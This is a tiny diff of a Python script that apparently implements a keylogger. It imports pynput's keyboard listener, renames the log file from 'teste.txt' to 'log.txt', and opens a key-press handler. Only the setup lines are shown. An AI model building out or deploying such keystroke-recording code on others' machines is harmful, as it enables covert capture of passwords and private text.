@@ -1,7 +1,7 @@
 from pynput import keyboard
 import re
 
-log = 'teste.txt'
+log = 'log.txt'
 
 def pressionar(key):
     key = str(key)
